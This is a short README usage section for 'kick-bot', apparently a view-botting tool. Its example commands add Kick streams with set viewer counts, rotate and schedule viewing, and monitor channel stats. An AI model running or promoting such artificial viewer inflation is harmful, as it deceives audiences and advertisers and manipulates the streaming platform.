---

## Usage

```bash
# Add stream to rotation
kick-bot add --stream "https://kick.com/channel" --viewers 100

# Start viewing rotation
kick-bot start --streams ./streams.txt --delay 30

# Monitor channel stats
kick-bot monitor --channel "channel_name" --interval 60

# Schedule viewing
kick-bot schedule --stream "URL" --viewers 50 --cron "0 18 * * *"
```
